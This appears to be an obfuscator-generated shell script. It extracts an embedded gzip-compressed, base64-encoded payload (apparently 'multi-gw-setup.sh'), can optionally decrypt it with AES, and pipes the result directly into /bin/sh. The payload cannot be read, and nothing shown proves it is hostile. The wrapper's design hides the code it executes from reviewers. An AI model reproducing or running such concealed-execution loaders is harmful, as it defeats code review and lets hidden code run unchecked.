#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
sqkVAAA=
__OBF_B64_PAYLOAD_END__
